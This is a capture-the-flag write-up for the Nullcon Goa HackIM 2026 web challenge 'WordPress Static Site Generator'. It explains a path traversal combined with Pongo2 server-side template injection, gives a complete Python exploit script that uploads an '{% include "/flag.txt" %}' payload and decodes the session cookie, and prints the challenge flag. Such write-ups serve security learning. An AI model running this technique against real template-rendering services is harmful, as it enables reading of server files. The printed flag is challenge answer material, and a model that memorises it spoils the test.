---
title: "WordPress Static Site Generator - Nullcon Goa HackIM 2026 CTF"
category: "web"
subcategory: "ssti"
type: "writeup"
tags: ["web", "ssti", "path-traversal", "base64", "wordpress", "nullcon-goa-hackim-2026-ctf", "2026", "ctf-writeup"]
summary: "Event: Nullcon Goa HackIM 2026 CTF"
source:
  name: "CTFtime writeup #40638"
  url: "https://ctftime.org/writeup/40638"
original_source: "https://github.com/RootRunners/Nullcon-Goa-HackIM-2026-CTF-RootRunners-Official-Write-ups/blob/main/Web/WordPress_Static_Site_Generator/README.md"
ctf:
  name: "Nullcon Goa HackIM 2026 CTF"
  year: 2026
  challenge: "WordPress Static Site Generator"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2026 CTF
- **Task:** WordPress Static Site Generator
- **Author team:** RootRunners
- **CTFtime tags:** web
- **CTFtime:** <https://ctftime.org/writeup/40638>
- **Original writeup:** <https://github.com/RootRunners/Nullcon-Goa-HackIM-2026-CTF-RootRunners-Official-Write-ups/blob/main/Web/WordPress_Static_Site_Generator/README.md>

---
# WordPress Static Site Generator

**Event:** Nullcon Goa HackIM 2026 CTF   
**Category:** Web   
**Points:** 215   
**Service:** `52.59.124.14:5001` 

## Overview  
The generator uploads a user file, stores it under `uploads/<id>/`, and later renders `templates/{template}.html` using Pongo2. The `template` parameter is not sanitized, so `../` traversal allows rendering a user-uploaded template and executing server-side includes.

## Vulnerability  
\- Path traversal in `template` lets us reach `../uploads/<id>/pwn`.  
\- Pongo2 template injection allows `{% include "/flag.txt" %}`.

## Solution  
1\. Upload a file named `pwn.html` containing `{% include "/flag.txt" %}`.  
2\. Parse the `wp-session` cookie to extract the upload ID.  
3\. Call `/generate` with `template=../uploads/<id>/pwn`.  
4\. The response includes the flag.

## Exploit Script  
```python  
#!/usr/bin/env python3  
import base64  
import re  
import urllib.parse  
import urllib.request

BASE = "http://52.59.124.14:5001"

def build_multipart(field_name, filename, content, content_type="application/octet-stream"):  
boundary = "----WpStaticBoundary7d3a"  
parts = []  
parts.append(f"--{boundary}")  
parts.append(  
f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"'  
)  
parts.append(f"Content-Type: {content_type}")  
parts.append("")  
parts.append(content)  
parts.append(f"--{boundary}--")  
parts.append("")  
body = "\r\n".join(parts).encode()  
return body, boundary

def upload_payload(html_payload):  
body, boundary = build_multipart("wordpress_xml", "pwn.html", html_payload, "text/html")  
req = urllib.request.Request(BASE + "/upload", data=body)  
req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")  
with urllib.request.urlopen(req, timeout=10) as r:  
headers = dict(r.headers)  
cookies = headers.get("Set-Cookie", "")  
# Use the last wp-session (usually contains uploaded_file)  
session = None  
for part in cookies.split(","):  
if "wp-session=" in part:  
session = part.split("wp-session=", 1)[1].split(";", 1)[0].strip()  
if not session:  
raise RuntimeError("wp-session cookie not found")  
return session

def extract_id(session_cookie):  
pad = "=" * ((4 - len(session_cookie) % 4) % 4)  
raw = base64.urlsafe_b64decode(session_cookie + pad)  
# raw is: ts|base64(gob)|sig  
parts = raw.split(b"|", 2)  
if len(parts) < 2:  
raise RuntimeError("unexpected cookie format")  
mid = parts[1]  
data = base64.urlsafe_b64decode(mid + b"=" * ((4 - len(mid) % 4) % 4))  
m = re.search(rb"[0-9a-f]{32}", data)  
if not m:  
raise RuntimeError("id not found in cookie payload")  
return m.group(0).decode()

def generate(session_cookie, template):  
body = urllib.parse.urlencode({"template": template}).encode()  
req = urllib.request.Request(BASE + "/generate", data=body)  
req.add_header("Cookie", f"wp-session={session_cookie}")  
with urllib.request.urlopen(req, timeout=10) as r:  
return r.read().decode("utf-8", "ignore")

def main():  
payload = "FLAG:{% include \"/flag.txt\" %}\n"  
session = upload_payload(payload)  
sid = extract_id(session)  
html = generate(session, f"../uploads/{sid}/pwn")  
m = re.search(r"ENO\\{[^}]+\\}", html)  
if not m:  
print("flag not found")  
return  
print(m.group(0))

if __name__ == "__main__":  
main()  
```

## Flag  
`ENO{PONGO2_T3MPl4T3_1NJ3cT1on_!s_Fun_To00!}`
